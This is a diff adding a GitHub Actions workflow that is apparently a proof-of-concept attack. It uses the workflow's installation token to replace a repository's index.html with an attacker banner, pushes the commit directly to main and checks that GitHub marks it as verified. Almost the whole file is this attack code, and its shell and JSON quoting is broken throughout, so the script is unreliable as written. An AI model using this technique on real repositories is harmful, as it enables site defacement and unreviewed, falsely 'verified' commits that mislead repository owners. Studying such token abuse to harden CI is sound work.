@@ -1,0 +1,24 @@
+name: apptoken-commit
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  c:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create commit via API with the installation token
+        env:
+          TOK: ${{ github.token }}
+        run: |
+          set -e
+          API=https://api.github.com/repos/${{ github.repository }}
+          BASE=$(curl -s -H "authorization: token $TOK" $API/git/ref/heads/main | python3 -c "import sys,json;print(json.load(sys.stdin)["object"]["sha"])")
+          TREE=$(curl -s -H "authorization: token $TOK" $API/git/commits/$BASE | python3 -c "import sys,json;print(json.load(sys.stdin)["tree"]["sha"])")
+          BLOB=$(curl -s -X POST -H "authorization: token $TOK" $API/git/blobs -d '{"content":"PGgxPkFUVEFDS0VSLVZJQS1JTlNUQUxMQVRJT04tVE9LRU48L2gxPg==","encoding":"base64"}' | python3 -c "import sys,json;print(json.load(sys.stdin)["sha"])")
+          NT=$(curl -s -X POST -H "authorization: token $TOK" $API/git/trees -d "{"base_tree":"$TREE","tree":[{"path":"index.html","mode":"100644","type":"blob","sha":"$BLOB"}]}" | python3 -c "import sys,json;print(json.load(sys.stdin)["sha"])")
+          # NO author, NO committer, NO signature -> GitHub auto-signs for the app installation
+          NC=$(curl -s -X POST -H "authorization: token $TOK" $API/git/commits -d "{"message":"ATTACK commit via installation token","tree":"$NT","parents":["$BASE"]}" | python3 -c "import sys,json;print(json.load(sys.stdin)["sha"])")
+          echo "new commit $NC"
+          curl -s -X PATCH -H "authorization: token $TOK" $API/git/refs/heads/main -d "{"sha":"$NC"}" -o /dev/null -w "ref update: %{http_code}
+"
+          curl -s -H "authorization: token $TOK" $API/commits/$NC | python3 -c "import sys,json;d=json.load(sys.stdin);print('VERIFIED',d["commit"]["verification"])"
